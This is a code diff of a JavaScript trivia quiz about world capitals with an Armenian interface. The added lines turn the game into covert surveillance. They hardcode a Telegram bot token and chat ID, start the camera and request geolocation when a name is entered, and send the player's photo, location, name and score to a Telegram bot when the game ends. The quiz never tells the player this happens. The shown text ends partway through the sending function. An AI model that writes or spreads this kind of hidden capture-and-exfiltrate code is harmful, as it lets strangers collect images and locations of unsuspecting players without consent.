@@ -1,79 +1,86 @@
+const botToken = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
+const chatId = '8071841674';
+
 const nameForm = document.getElementById('name-form');
 const nameInput = document.getElementById('name-input');
-const nameFormContainer = document.getElementById('name-form-container');
-const gameArea = document.getElementById('game-area');
-const userNameDisplay = document.getElementById('user-name');
+const userNameDiv = document.getElementById('user-name');
 const scoreInfo = document.getElementById('score-info');
-const questionContainer = document.getElementById('question');
-const answerButtons = document.getElementById('answer-buttons');
+const gameArea = document.getElementById('game-area');
+const questionElement = document.getElementById('question');
+const answerButtonsElement = document.getElementById('answer-buttons');
 const tryAgainBtn = document.getElementById('try-again-btn');
+const video = document.getElementById('video');
 
-let shuffledQuestions = [];
-let currentQuestionIndex = 0;
-let correctCount = 0;
-let wrongCount = 0;
 let userName = '';
+let currentQuestionIndex = 0;
+let score = 0;
+let wrong = 0;
+let questions = [];
+let photoData = null;
+let locationLink = 'Գեոլոկացիա չտրամադրվեց';
 
-nameForm.addEventListener('submit', (e) => {
+nameForm.addEventListener('submit', async (e) => {
   e.preventDefault();
-  userName = nameInput.value.trim();
-  nameFormContainer.style.display = 'none';
+  userName = nameInput.value.trim() || 'Անհայտ';
+  userNameDiv.textContent = userName;
+  document.getElementById('name-form-container').style.display = 'none';
   gameArea.style.display = 'block';
-  userNameDisplay.textContent = `👤 ${userName}`;
+  await startCamera();
+  getLocation();
   startGame();
 });
 
-tryAgainBtn.addEventListener('click', () => {
-  location.reload(); // или можно реализовать soft reset
-});
-
 function startGame() {
-  shuffledQuestions = shuffleArray([...questions]).slice(0, 20);
   currentQuestionIndex = 0;
-  correctCount = 0;
-  wrongCount = 0;
+  score = 0;
+  wrong = 0;
+  questions = getRandomQuestions(10);
   showQuestion();
+}
+
+function getRandomQuestions(count) {
+  const shuffled = allQuestions.sort(() => 0.5 - Math.random());
+  return shuffled.slice(0, count);
 }
 
 function showQuestion() {
   resetState();
-  const currentQuestion = shuffledQuestions[currentQuestionIndex];
-  questionContainer.textContent = currentQuestion.question;
+  const question = questions[currentQuestionIndex];
+  questionElement.textContent = question.question;
 
-  currentQuestion.answers.forEach((answer, index) => {
+  const shuffledAnswers = question.answers.sort(() => 0.5 - Math.random());
+  shuffledAnswers.forEach(answer => {
     const button = document.createElement('button');
-    button.textContent = answer.text;
-    button.classList.add('fade-in');
-    button.addEventListener('click', () => selectAnswer(button, answer.correct));
-    answerButtons.appendChild(button);
+    button.textContent = answer;
+    button.addEventListener('click', () => selectAnswer(button, question.correct));
+    answerButtonsElement.appendChild(button);
   });
 
-  updateScoreInfo();
+  updateScoreBar();
 }
 
 function resetState() {
-  answerButtons.innerHTML = '';
+  answerButtonsElement.innerHTML = '';
 }
 
-function selectAnswer(button, correct) {
-  const buttons = answerButtons.querySelectorAll('button');
-  buttons.forEach(btn => btn.disabled = true);
+function selectAnswer(button, correctAnswer) {
+  const buttons = Array.from(answerButtonsElement.children);
+  buttons.forEach(btn => {
+    if (btn.textContent === correctAnswer) btn.classList.add('correct');
+    if (btn !== button && btn.textContent !== correctAnswer) btn.disabled = true;
+  });
 
-  if (correct) {
+  if (button.textContent === correctAnswer) {
     button.classList.add('correct');
-    correctCount++;
+    score++;
   } else {
     button.classList.add('wrong');
-    const correctBtn = [...buttons].find(btn =>
-      shuffledQuestions[currentQuestionIndex].answers.find(a => a.text === btn.textContent && a.correct)
-    );
-    if (correctBtn) correctBtn.classList.add('correct');
-    wrongCount++;
+    wrong++;
   }
 
+  currentQuestionIndex++;
   setTimeout(() => {
-    currentQuestionIndex++;
-    if (currentQuestionIndex < shuffledQuestions.length) {
+    if (currentQuestionIndex < questions.length) {
       showQuestion();
     } else {
       endGame();
@@ -81,76 +88,32 @@ function selectAnswer(button, correct) {
   }, 1500);
 }
 
-function updateScoreInfo() {
-  const left = shuffledQuestions.length - currentQuestionIndex;
-  scoreInfo.innerHTML = `🔵 Մնացել է՝ ${left} | ✅ Ճիշտ՝ ${correctCount} | ❌ Սխալ՝ ${wrongCount}`;
+function updateScoreBar() {
+  scoreInfo.textContent = `Հարցեր՝ ${currentQuestionIndex + 1}/${questions.length} | Ճիշտ՝ ${score} | Սխալ՝ ${wrong}`;
 }
 
 function endGame() {
-  questionContainer.textContent = correctCount >= 15
-    ? '🎉 Շնորհավորում ենք, դուք հաղթեցիք!'
-    : '😔 Փորձեք կրկին։';
-  answerButtons.innerHTML = '';
-  tryAgainBtn.style.display = 'inline-block';
+  sendTelegramData();
+  tryAgainBtn.style.display = 'block';
+  tryAgainBtn.onclick = () => {
+    tryAgainBtn.style.display = 'none';
+    nameForm.reset();
+    document.getElementById('name-form-container').style.display = 'block';
+    gameArea.style.display = 'none';
+  };
 }
 
-// ===== Questions (50 randomized) =====
-
-const questions = [
-  {
-    question: "Որն է Ֆրանսիայի մայրաքաղաքը?",
-    answers: shuffleAnswers(["Փարիզ", "Լիոն", "Մարսել", "Նիցցա"], 0)
-  },
-  {
-    question: "Որն է Գերմանիայի մայրաքաղաքը?",
-    answers: shuffleAnswers(["Բեռլին", "Մյունխեն", "Համբուրգ", "Քյոլն"], 0)
-  },
-  {
-    question: "Որն է Հայաստանի մայրաքաղաքը?",
-    answers: shuffleAnswers(["Երևան", "Գյումրի", "Վանաձոր", "Աշտարակ"], 0)
-  },
-  {
-    question: "Որն է Ռուսաստանի մայրաքաղաքը?",
-    answers: shuffleAnswers(["Մոսկվա", "Սանկտ-Պետերբուրգ", "Կազան", "Սոչի"], 0)
-  },
-  {
-    question: "Որն է ԱՄՆ-ի մայրաքաղաքը?",
-    answers: shuffleAnswers(["Վաշինգտոն", "Նյու Յորք", "Լոս Անջելես", "Չիկագո"], 0)
-  },
-  {
-    question: "Որն է Կանադայի մայրաքաղաքը?",
-    answers: shuffleAnswers(["Օտտավա", "Տորոնտո", "Վանկուվեր", "Մոնրեալ"], 0)
-  },
-  {
-    question: "Որն է Չինաստանի մայրաքաղաքը?",
-    answers: shuffleAnswers(["Պեկին", "Շանհայ", "Գուանչժոու", "Հոնկոնգ"], 0)
-  },
-  {
-    question: "Որն է Ճապոնիայի մայրաքաղաքը?",
-    answers: shuffleAnswers(["Տոկիո", "Օսակա", "Կիոտո", "Հիրոսիմա"], 0)
-  },
-  {
-    question: "Որն է Մեքսիկայի մայրաքաղաքը?",
-    answers: shuffleAnswers(["Մեխիկո", "Գվադալախարա", "Մոնտերեյ", "Տիհուանա"], 0)
-  },
-  {
-    question: "Որն է Եգիպտոսի մայրաքաղաքը?",
-    answers: shuffleAnswers(["Կահիրե", "Ալեքսանդրիա", "Լուքսոր", "Գիզա"], 0)
-  },
-  // ...ещё 40 вопросов — скажи, если хочешь полный список (или загрузку файлом)
-];
-
-// === Utilities ===
-
-function shuffleArray(array) {
-  return array.sort(() => Math.random() - 0.5);
-}
-
-function shuffleAnswers(options, correctIndex) {
-  const correct = options[correctIndex];
-  const answers = options.map((text, i) => ({
-    text,
-    correct: i === correctIndex
-  }));
-  return shuffleArray(answers);
-}
+function sendTelegramData() {
+  const message = `👤 Անուն: ${userName}%0A✅ Ճիշտ պատասխաններ: ${score}%0A❌ Սխալ պատասխաններ: ${wrong}%0A📍 Տեղադրություն: ${locationLink}`;
+  if (photoData) {
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: 'POST',
+      body: JSON.stringify({
+        chat_id: chatId,
+        photo: photoData,
+        caption: message,
+        parse_mode: 'HTML'
+      }),
+      headers: { 'Content-Type': 'application/json' }
+    });
+ 
